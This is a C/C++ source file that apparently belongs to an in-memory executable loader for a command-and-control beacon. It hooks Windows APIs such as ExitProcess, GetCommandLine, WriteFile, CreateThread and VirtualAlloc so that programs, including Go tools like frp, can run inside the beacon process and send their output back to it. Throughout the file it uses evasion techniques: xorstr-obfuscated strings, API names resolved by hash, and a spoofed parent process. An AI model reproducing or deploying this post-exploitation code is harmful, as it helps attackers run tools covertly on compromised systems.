#ifdef _DEBUG
#include "stkstr.hpp"
#define xorstr_ stkstr_
#else
#include "xorstr.hpp"
#endif

#ifdef _MSC_VER
#define _forceinline __forceinline
#else
#define _forceinline __attribute__((always_inline)) inline
#endif

constexpr unsigned __shift = ([]() constexpr -> unsigned {
  unsigned shifts[] = {1, 3, 5, 7, 11, 13, 17, 19, 23, 29};
  return shifts[__TIME__[7] - '0'];
})();

template <size_t N, class CharT>
constexpr unsigned __hash(const CharT (&s)[N]) {
  unsigned h = 0;
  for (size_t i = 0; i < N - 1; i++) {
    h = (h >> __shift) | (h << (32 - __shift));
    h += s[i];
  }
  return h;
}

template <unsigned v> constexpr unsigned __force_compile_time_result() {
  return v;
}

#define HashCT(s) __force_compile_time_result<__hash(s)>()

template <class CharT> _forceinline unsigned HashRT(const CharT *s) {
  unsigned h = 0;
  do {
    h = (h >> __shift) | (h << (32 - __shift));
    h += *s;
  } while (*++s);
  return h;
}

extern "C" {
#ifndef HOOKS_DLL
#include "hookspub.h"
#include "stdarg.h"

HookResult HookControlEntry(HookControl id, va_list args);
HookResult __HookControlEntry(HookControl id, ...) {
  va_list args;
  va_start(args, id);
  HookResult result = HookControlEntry(id, args);
  va_end(args);
  return result;
}
#endif

#include "hooks.hpp"

// clang-format off
#include "simplelist.c"
#include "pipeserver.c"
// clang-format on

#define HasFeatures(x) (((*getctx())->Features & (x)) == (x))

#define Logs (*getctx())->Logs
#define LogLock (*getctx())->LogLock

#define JobOutputWriteHandle (*getctx())->JobOutputWriteHandle
#define JobOutputLock (*getctx())->JobOutputLock

#define ProcessExitedEvent (*getctx())->ProcessExitedEvent
#define ProcessExitedThreadHandle (*getctx())->ProcessExitedThreadHandle

#define CommandLineA (*getctx())->CommandLineA
#define CommandLineW (*getctx())->CommandLineW

#define ParentProcessId (*getctx())->ParentProcessId

#define StdinPipe (*getctx())->StdinPipe
#define StdoutPipe (*getctx())->StdoutPipe
#define StderrPipe (*getctx())->StderrPipe

#define ThreadList (*getctx())->ThreadList
#define ThreadListLock (*getctx())->ThreadListLock
#define ExceptionHandlerList (*getctx())->ExceptionHandlerList
#define MemoryList (*getctx())->MemoryList
#define MemoryListLock (*getctx())->MemoryListLock
#define TlsList (*getctx())->TlsList
#define TlsListLock (*getctx())->TlsListLock

#define Kernel32Base (*getctx())->Kernel32Base

void BeaconPrintfPostMsg(int type, const char *fmt, ...) {
  char *str = NULL;
  int strCb = 0;
  wchar_t *wstr = NULL;
  int wstrCch = 0;
  LogEntry log;
  BOOL result = FALSE;
  va_list args;

  // Format string
  va_start(args, fmt);
  strCb = _vscprintf(fmt, args);
  va_end(args);
  if (strCb < 0)
    goto err;
  strCb += 1;
  str = (char *)malloc(strCb);
  if (!str)
    goto err;
  va_start(args, fmt);
  vsprintf_s(str, strCb, fmt, args);
  va_end(args);

  if (type == CALLBACK_OUTPUT_UTF8) {
    // Convert UTF-8 to Unicode first
    wstrCch = MultiByteToWideChar(CP_UTF8, 0, str, strCb, NULL, 0);
    if (!wstrCch)
      goto err;
    wstr = (wchar_t *)malloc(wstrCch * sizeof(wchar_t));
    if (!wstr)
      goto err;
    wstrCch = MultiByteToWideChar(CP_UTF8, 0, str, strCb, wstr, wstrCch);
    if (!wstrCch)
      goto err;

    // Then convert Unicode to Ansi back
    strCb = WideCharToMultiByte(CP_ACP, 0, wstr, wstrCch, NULL, 0, NULL, NULL);
    if (!strCb)
      goto err;
    free(str);
    str = (char *)malloc(strCb);
    if (!str)
      goto err;
    strCb =
        WideCharToMultiByte(CP_ACP, 0, wstr, wstrCch, str, strCb, NULL, NULL);
    if (!strCb)
      goto err;

    // Set type to CALLBACK_OUTPUT
    type = CALLBACK_OUTPUT;
  }

  // Post message
  OutputDebugStringA(str);
  OutputDebugStringA(xorstr_("\n"));
  if (JobOutputWriteHandle) {
    str[strCb - 1] = '\n';
    SpinLock(JobOutputLock,
             result = WriteFile(JobOutputWriteHandle, str, strCb, NULL, NULL));
    str[strCb - 1] = '\0';
    if (!result)
      goto err;
  } else {
    log = {type, strCb, str};
    SpinLock(LogLock, SimpleListAdd(&Logs, LogEntry, log));
    str = NULL; // Don't free
  }
  goto out;

err:
#ifdef _DEBUG
  __debugbreak();
#endif
out:
  if (str)
    free(str);
  if (wstr)
    free(wstr);
}

/*
 * HookContext
 */

VOID WINAPI MyExitProcess(_In_ UINT uExitCode) {
  TRACEF("ExitProcess was called.");
  if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
    SpinLock(ThreadListLock, {
      SimpleListForEach(&ThreadList, DWORD, entry, {
        DWORD id = *entry;
        if (id == (DWORD)(SIZE_T)NtCurrentThreadId())
          continue;
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, id);
        if (hThread) {
          TerminateThread(hThread, 0);
          TRACEF("Thread %d was terminated.", (UINT)id);
          CloseHandle(hThread);
        } else {
          TRACEF("Can't open thread %d. Maybe already exited.", (UINT)id);
        }
      });
    });
    TRACEF("Thread %d will be terminated.", (UINT)(SIZE_T)NtCurrentThreadId());
  }
  ProcessExitedThreadHandle =
      OpenThread(THREAD_ALL_ACCESS, FALSE, (DWORD)(SIZE_T)NtCurrentThreadId());
  SetEvent(ProcessExitedEvent);
  PRINTF("Process exited with code %d. Use 'inline-wait-pe' to get results and "
         "unload the PE image.",
         uExitCode);
  ExitThread(uExitCode);
}

LPSTR WINAPI MyGetCommandLineA() {
  TRACEF("GetCommandLineA was called.");
  return CommandLineA;
}

LPWSTR WINAPI MyGetCommandLineW() {
  TRACEF("GetCommandLineW was called.");
  return CommandLineW;
}

HANDLE WINAPI MyGetStdHandle(_In_ DWORD nStdHandle) {
  TRACEF("GetStdHandle was called. (nStdHandle: %d)", (UINT)nStdHandle);
  switch (nStdHandle) {
  case STD_INPUT_HANDLE:
    return StdinPipe.ReadHandle;
  case STD_OUTPUT_HANDLE:
    return StdoutPipe.WriteHandle;
  case STD_ERROR_HANDLE:
    return StderrPipe.WriteHandle;
  default:
    return GetStdHandle(nStdHandle);
  }
}

BOOL WINAPI MyProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
  // CreateToolhelp32Snapshot will be called twice in
  // https://github.com/spf13/cobra/blob/main/command_win.go
  BOOL b = Process32NextW(hSnapshot, lppe);
  if (!b)
    return FALSE;
  // TRACEF("Process32NextW was called. (th32ProcessID: %d, szExeFile: %ws)",
  //        lppe->th32ProcessID, lppe->szExeFile);
  if (lppe->th32ProcessID == (DWORD)(SIZE_T)NtCurrentProcessId())
    ParentProcessId = lppe->th32ParentProcessID;
  if (lppe->th32ProcessID == ParentProcessId &&
      HashRT(lppe->szExeFile) == HashCT(L"explorer.exe"))
    lppe->szExeFile[0] = '_';
  return b;
}

BOOL WINAPI MyWriteFile(_In_ HANDLE hFile,
                        _In_reads_bytes_opt_(nNumberOfBytesToWrite)
                            LPCVOID lpBuffer,
                        _In_ DWORD nNumberOfBytesToWrite,
                        _Out_opt_ LPDWORD lpNumberOfBytesWritten,
                        _Inout_opt_ LPOVERLAPPED lpOverlapped) {
  char *s = (char *)lpBuffer;
  int len = (int)(long)nNumberOfBytesToWrite;
  if (s && len > 0 &&
      (hFile == StdoutPipe.WriteHandle || hFile == StderrPipe.WriteHandle)) {
    if (JobOutputWriteHandle) {
      SpinLock(JobOutputLock,
               WriteFile(JobOutputWriteHandle, s, len, NULL, NULL));
#ifdef _DEBUG
      char *buffer = (char *)malloc(len + 1);
      if (buffer) {
        _memcpy(buffer, s, len);
        buffer[len] = '\0';
        OutputDebugStringA(buffer);
        free(buffer);
      }
#endif
    } else {
      int type =
          HasFeatures(HookFeatureCpp) ? CALLBACK_OUTPUT : CALLBACK_OUTPUT_UTF8;
      if (len >= 1 && s[len - 1] == '\n')
        len -= 1;
      if (len >= 1 && s[len - 1] == '\r')
        len -= 1;
      char format[] = "%.*s";
      _BeaconPrint(type, format, len, s);
    }
  }
  return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite,
                   lpNumberOfBytesWritten, lpOverlapped);
}

HANDLE WINAPI MyCreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
                             _In_ SIZE_T dwStackSize,
                             _In_ LPTHREAD_START_ROUTINE lpStartAddress,
                             _In_opt_ __drv_aliasesMem LPVOID lpParameter,
                             _In_ DWORD dwCreationFlags,
                             _Out_opt_ LPDWORD lpThreadId) {
  // TODO: lock?
  // 1. MyCreateThread: after CreateThread before SimpleListAdd
  // 2. MyExitProcess: in SpinLock(ThreadListLock, ...)
  // 3. MyCreateThread: SimpleListAdd fails
  // 4. Memory was freed and new thread crashes
  HANDLE hThread = CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress,
                                lpParameter, dwCreationFlags, lpThreadId);
  if (!hThread)
    return NULL;
  DWORD threadId = GetThreadId(hThread);
  SpinLock(ThreadListLock, SimpleListAdd(&ThreadList, DWORD, threadId));
  TRACEF("Thread %d was created at %p with parameter %p.", (UINT)threadId,
         lpStartAddress, lpParameter);
  return hThread;
}

_Ret_maybenull_ PVOID WINAPI MyAddVectoredExceptionHandler(
    _In_ ULONG First, _In_ PVECTORED_EXCEPTION_HANDLER Handler) {
  PVOID handle = AddVectoredExceptionHandler(First, Handler);
  TRACEF("AddVectoredExceptionHandler was called. (First: %d, Handler: %p, "
         "handle: %p)",
         (UINT)First, Handler, handle);
  ExceptionHandlerEntry entry = {EHTYPE_VEH, handle};
  SimpleListAdd(&ExceptionHandlerList, ExceptionHandlerEntry, entry);
  return handle;
}

_Ret_maybenull_ PVOID WINAPI MyAddVectoredContinueHandler(
    _In_ ULONG First, _In_ PVECTORED_EXCEPTION_HANDLER Handler) {
  PVOID handle = AddVectoredContinueHandler(First, Handler);
  TRACEF("AddVectoredContinueHandler was called. (First: %d, Handler: %p, "
         "handle: %p)",
         (UINT)First, Handler, handle);
  ExceptionHandlerEntry entry = {EHTYPE_VCH, handle};
  SimpleListAdd(&ExceptionHandlerList, ExceptionHandlerEntry, entry);
  return handle;
}

/*
// TODO: SetUnhandledExceptionFilter does not have a corresponding remove
// function. If multiple golang programs are executed in memory together, set
// previous exception filter will fail. (32bit only)
LPTOP_LEVEL_EXCEPTION_FILTER WINAPI MySetUnhandledExceptionFilter(
    _In_opt_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter) {
  LPTOP_LEVEL_EXCEPTION_FILTER previous =
      SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
  TRACEF("SetUnhandledExceptionFilter was called. (lpTopLevelExceptionFilter: "
         "%p, previous: %p)",
         lpTopLevelExceptionFilter, previous);
  ExceptionHandlerEntry entry = {EHTYPE_UEF, (PVOID)previous};
  SimpleListAdd(&ExceptionHandlerList, ExceptionHandlerEntry, entry);
  return previous;
}
*/

BOOL WINAPI MySetConsoleCtrlHandler(_In_opt_ PHANDLER_ROUTINE HandlerRoutine,
                                    _In_ BOOL Add) {
  TRACEF("SetConsoleCtrlHandler was called. (HandlerRoutine: %p, Add: %d)",
         HandlerRoutine, Add);
  return TRUE;
}

_Ret_maybenull_ _Post_writable_byte_size_(dwSize) LPVOID WINAPI
    MyVirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize,
                   _In_ DWORD flAllocationType, _In_ DWORD flProtect) {
  LPVOID p = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
  TRACEF("VirtualAlloc was called. (%p, %x, %x, %x, %p)", lpAddress,
         (UINT)dwSize, (UINT)flAllocationType, (UINT)flProtect, p);
  if (flAllocationType & MEM_RESERVE) {
    SpinLock(MemoryListLock, SimpleListAdd(&MemoryList, LPVOID, p));
    TRACEF("Memory %p was added to list.", p);
  }
  return p;
}

BOOL WINAPI MyVirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize,
                          _In_ DWORD dwFreeType) {
  BOOL b = VirtualFree(lpAddress, dwSize, dwFreeType);
  TRACEF("VirtualFree was called. (%p, %x, %x, %d)", lpAddress, dwSize,
         dwFreeType, b);
  if (!dwSize && (dwFreeType & MEM_RELEASE)) {
    SpinLock(MemoryListLock, {
      SimpleListForEach(&MemoryList, LPVOID, p, {
        if (*p == lpAddress) {
          *p = NULL;
          TRACEF("Memory %p was removed from list.", lpAddress);
          break;
        }
      });
    });
  }
  return b;
}

DWORD WINAPI MyTlsAlloc() {
  DWORD i = TlsAlloc();
  TRACEF("TlsAlloc was called. (i: %d)", (UINT)i);
  SpinLock(TlsListLock, SimpleListAdd(&TlsList, DWORD, i));
  return i;
}

FARPROC WINAPI MyGetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName) {
  if ((SIZE_T)lpProcName < 0x10000) {
    // TRACEF("GetProcAddress was called. (hModule: %p, nOrdinal: %d)", hModule,
    //        (WORD)lpProcName);
    return GetProcAddress(hModule, lpProcName);
  }
  // TRACEF("GetProcAddress was called. (hModule: %p, lpProcName: %s)", hModule,
  //        lpProcName);
  unsigned hash = HashRT(lpProcName);
  if (hModule == Kernel32Base) {
    // Prevent from exiting process (see
    // https://github.com/golang/go/blob/go1.23.0/src/runtime/proc.go#L296)
    if (hash == HashCT("ExitProcess"))
      return (FARPROC)AddressOfMyExitProcess;

    // Masquerade command-line
    if (HasFeatures(HookFeatureCommandLine)) {
      if (hash == HashCT("GetCommandLineA"))
        return (FARPROC)AddressOfMyGetCommandLineA;
      if (hash == HashCT("GetCommandLineW"))
        return (FARPROC)AddressOfMyGetCommandLineW;
    }

    // Redirect stdio
    if (HasFeatures(HookFeatureRedirectStdio) && hash == HashCT("GetStdHandle"))
      return (FARPROC)AddressOfMyGetStdHandle;

    // For cobra command line parser (see
    // https://github.com/spf13/cobra/blob/main/command_win.go) (used by frp)
    if (HasFeatures(HookFeatureGoCobraFakeParentProcess) &&
        hash == HashCT("Process32NextW"))
      return (FARPROC)AddressOfMyProcess32NextW;

    // Streaming stdout/stderr
    if (HasFeatures(HookFeatureStreamingOutput) && hash == HashCT("WriteFile"))
      return (FARPROC)AddressOfMyWriteFile;

    if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
      // Hook CreateThread to collect all go routines
      if (hash == HashCT("CreateThread"))
        return (FARPROC)AddressOfMyCreateThread;
      // Hook VEH functions to collect VEHs (see
      // https://github.com/golang/go/blob/go1.23.0/src/runtime/signal_windows.go#L50)
      if (hash == HashCT("AddVectoredExceptionHandler"))
        return (FARPROC)AddressOfMyAddVectoredExceptionHandler;
      if (hash == HashCT("AddVectoredContinueHandler"))
        return (FARPROC)AddressOfMyAddVectoredContinueHandler;
      // Prevent program from crashing when closing console window (see
      // https://github.com/golang/go/blob/go1.23.0/src/runtime/os_windows.go#L543)
      if (hash == HashCT("SetConsoleCtrlHandler"))
        return (FARPROC)AddressOfMySetConsoleCtrlHandler;
      // Track pages allocated from VirtualAlloc
      if (hash == HashCT("VirtualAlloc"))
        return (FARPROC)AddressOfMyVirtualAlloc;
      if (hash == HashCT("VirtualFree"))
        return (FARPROC)AddressOfMyVirtualFree;
      if (hash == HashCT("TlsAlloc"))
        return (FARPROC)AddressOfMyTlsAlloc;
    }

    // Dynamic resolution (e.g. UPX)
    if (hash == HashCT("GetProcAddress"))
      return (FARPROC)AddressOfMyGetProcAddress;
  }
  return GetProcAddress(hModule, lpProcName);
}

typedef int(WINAPI *ExeEntryProc)(void);

/*
 * Exe entry-point wrapper
 */

DWORD WINAPI RunExeEntryProc(LPVOID lpThreadParameter) {
  TRACEF("RunExeEntryProc was called. (entryPoint: %p)", lpThreadParameter);
  ((ExeEntryProc)lpThreadParameter)();
  TRACEF("Unreachable.");
  ExitThread(-1);
  return -1;
}

/*
 * Hook control
 */

HookResult HookControlCreateImpl(HookContext *ctx, void *stdin_, int stdinSize,
                                 char *commandLineA, int commandLineASize,
                                 wchar_t *commandLineW, int commandLineWSize,
                                 void *hJobWritePipe) {
  OutputDebugStringA(xorstr_("Begin HookControlCreateImpl\n"));

  // Assume that APIs in ctx struct were already filled.

  // Allocate logs
  if (!SimpleListAlloc(&Logs, sizeof(LogEntry) * 64))
    return HookResultErrorCreateLogs;

  // Initialize beacon job stuff
  JobOutputWriteHandle = hJobWritePipe;
  JobOutputLock = 0;

  // Create process exited event
  ProcessExitedEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
  if (!ProcessExitedEvent)
    return HookResultErrorCreateProcessExitedEvent;
  ProcessExitedThreadHandle = NULL;

  // Copy command-line Ansi and Unicode
  if (HasFeatures(HookFeatureCommandLine)) {
    if (!commandLineA)
      return HookResultErrorInvalidArgument;
    CommandLineA = (char *)malloc(commandLineASize);
    if (!CommandLineA)
      return HookResultErrorCreateCommandLine;
    _memcpy(CommandLineA, commandLineA, commandLineASize);
    if (!commandLineW)
      return HookResultErrorInvalidArgument;
    CommandLineW = (wchar_t *)malloc(commandLineWSize);
    if (!CommandLineW)
      return HookResultErrorCreateCommandLine;
    _memcpy(CommandLineW, commandLineW, commandLineWSize);
  }

  // Zero ParentProcessId
  if (HasFeatures(HookFeatureGoCobraFakeParentProcess))
    ParentProcessId = 0;

  // Create pipe servers
  if (HasFeatures(HookFeatureRedirectStdio)) {
    if (!stdin_ || stdinSize < 0)
      return HookResultErrorInvalidArgument;
    if (!CreateWritePipeServer(&StdinPipe, stdin_, stdinSize,
                               AddressOfWritePipeServerProc) ||
        !CreateReadPipeServer(&StdoutPipe, AddressOfReadPipeServerProc) ||
        !CreateReadPipeServer(&StderrPipe, AddressOfReadPipeServerProc))
      return HookResultErrorCreatePipeServers;
  }

  // Allocate new thread list, exception handler list and memory list to support
  // unloading go
  if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
    if (!SimpleListAlloc(&ThreadList, sizeof(DWORD) * 128))
      return HookResultErrorCreateNewThreadList;
    ThreadListLock = 0;
    if (!SimpleListAlloc(&ExceptionHandlerList,
                         sizeof(ExceptionHandlerEntry) * 8))
      return HookResultErrorCreateExceptionHandlerList;
    if (!SimpleListAlloc(&MemoryList, sizeof(LPVOID) * 64))
      return HookResultErrorCreateMemoryList;
    MemoryListLock = 0;
    if (!SimpleListAlloc(&TlsList, sizeof(DWORD) * 8))
      return HookResultErrorCreateTlsList;
    TlsListLock = 0;
  }

  // Get kernel32.dll image base for MyGetProcAddress
  Kernel32Base = GetModuleHandleA(xorstr_("kernel32.dll"));
  if (!Kernel32Base)
    return HookResultErrorCreateKernel32Base;

  // Return detours
  ctx->MyGetProcAddress = AddressOfMyGetProcAddress;

  return HookResultSuccess;
}

void HookControlDeleteImpl(HookContext *ctx) {
  OutputDebugStringA(xorstr_("Begin HookControlDeleteImpl\n"));

  ctx->MyGetProcAddress = NULL;
  Kernel32Base = NULL;

  // Free new thread list, exception handler list and memory list
  if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
    SimpleListFree(&ThreadList);
    ThreadListLock = 0;
    SimpleListFree(&ExceptionHandlerList);
    SimpleListFree(&MemoryList);
    MemoryListLock = 0;
    SimpleListFree(&TlsList);
    TlsListLock = 0;
  }

  // Close pipe servers
  if (HasFeatures(HookFeatureRedirectStdio)) {
    CloseWritePipeServer(&StdinPipe);
    CloseReadPipeServer(&StdoutPipe, FALSE);
    CloseReadPipeServer(&StderrPipe, FALSE);
  }

  // Zero ParentProcessId
  if (HasFeatures(HookFeatureGoCobraFakeParentProcess))
    ParentProcessId = 0;

  // Free command-line buffers
  if (HasFeatures(HookFeatureCommandLine)) {
    if (CommandLineA) {
      free(CommandLineA);
      CommandLineA = NULL;
    }
    if (CommandLineW) {
      free(CommandLineW);
      CommandLineW = NULL;
    }
  }

  // Delete process exited event
  if (ProcessExitedEvent) {
    CloseHandle(ProcessExitedEvent);
    ProcessExitedEvent = NULL;
  }
  ProcessExitedThreadHandle = 0;

  // Free beacon job stuff
  JobOutputWriteHandle = NULL;
  JobOutputLock = 0;

  // Free logs
  SimpleListForEach(&Logs, LogEntry, log, {
    if (log->Text) {
      free(log->Text);
      log->Text = NULL;
    }
  });
  SimpleListFree(&Logs);
}

HookResult HookControlStartImpl(HookContext *ctx, void *entryPoint) {
  OutputDebugStringA(xorstr_("Begin HookControlStartImpl\n"));

  HANDLE hThread;
  if (HasFeatures(HookFeatureUnload | HookFeatureGo))
    hThread = MyCreateThread(NULL, 0,
                             (LPTHREAD_START_ROUTINE)AddressOfRunExeEntryProc,
                             (PVOID)entryPoint, 0, NULL);
  else
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AddressOfRunExeEntryProc,
                     (PVOID)entryPoint, 0, NULL);
  if (!hThread)
    return HookResultErrorStartNewThread;
  CloseHandle(hThread);
  return HookResultSuccess;
}

HookResult HookControlStopImpl(HookContext *ctx, int timeoutMilliseconds) {
  OutputDebugStringA(xorstr_("Begin HookControlStopImpl\n"));

  // Wait for process exit event
  if (WaitForSingleObject(ProcessExitedEvent, (DWORD)timeoutMilliseconds) !=
      WAIT_OBJECT_0)
    return HookResultErrorStopWaitTimeout;

  // Wait for the thread that sets the process exit event to exit
  HANDLE lastThread = ProcessExitedThreadHandle;
  if (!lastThread)
    return HookResultErrorStopWaitLastThread;
  WaitForSingleObject(lastThread, INFINITE);
  CloseHandle(lastThread);

  // Remove all top level exception handlers and release memory pages
  if (HasFeatures(HookFeatureUnload | HookFeatureGo)) {
    SimpleListForEach(&ExceptionHandlerList, ExceptionHandlerEntry, eh, {
      PVOID result = NULL;
      if (eh->Type == EHTYPE_VEH)
        result = (PVOID)(SIZE_T)RemoveVectoredExceptionHandler(eh->Handle);
      else if (eh->Type == EHTYPE_VCH)
        result = (PVOID)(SIZE_T)RemoveVectoredContinueHandler(eh->Handle);
      TRACEF(
          "Exception handler was removed. (type: %d, handle: %p, result: %p)",
          eh->Type, eh->Handle, result);
    });
    TRACEF("All exception handlers were removed.");
    SimpleListForEach(&MemoryList, LPVOID, p, {
      if (*p) {
        VirtualFree(*p, 0, MEM_RELEASE);
        TRACEF("Memory %p was released.", *p);
      }
    });
    TRACEF("All memory pages were released.");
    SimpleListForEach(&TlsList, DWORD, i, {
      TlsFree(*i);
      TRACEF("Tls %d was released.", *i);
    });
    TRACEF("All tls were released.");
  }
  if (HasFeatures(HookFeatureUnload))
    SetUnhandledExceptionFilter(NULL);

  return HookResultSuccess;
}

HookResult HookControlEntry(HookControl id, va_list args) {
  if (id == HookControlCreate) {
    // Get arguments
    HookContext *ctx = va_arg(args, HookContext *);
    void *stdin_ = va_arg(args, void *);
    int stdinSize = va_arg(args, int);
    char *commandLineA = va_arg(args, char *);
    int commandLineASize = va_arg(args, int);
    wchar_t *commandLineW = va_arg(args, wchar_t *);
    int commandLineWSize = va_arg(args, int);
    void *hJobWritePipe = va_arg(args, void *);
    if (!ctx)
      return HookResultErrorInvalidArgument;

    // Initialize hook context
    *getctx() = ctx;
    HookResult result = HookControlCreateImpl(
        ctx, stdin_, stdinSize, commandLineA, commandLineASize, commandLineW,
        commandLineWSize, hJobWritePipe);
    if (result != HookResultSuccess) {
      HookControlDeleteImpl(ctx);
      return result;
    }

    return HookResultSuccess;
  } else if (id == HookControlDelete) {
    HookContext *ctx = *getctx();
    if (!ctx)
      return HookResultErrorNotYetCreated;

    HookControlDeleteImpl(ctx);
    *getctx() = NULL;
    return HookResultSuccess;
  } else if (id == HookControlStart) {
    // Get arguments
    HookContext *ctx = *getctx();
    void *entryPoint = va_arg(args, void *);
    if (!entryPoint)
      return HookResultErrorInvalidArgument;
    if (!ctx)
      return HookResultErrorNotYetCreated;

    return HookControlStartImpl(ctx, entryPoint);
  } else if (id == HookControlStop) {
    // Get arguments
    HookContext *ctx = *getctx();
    int timeoutMilliseconds = va_arg(args, int);
    if (!ctx)
      return HookResultErrorNotYetCreated;

    return HookControlStopImpl(ctx, timeoutMilliseconds);
  }
  return HookResultErrorInvalidControl;
}
}
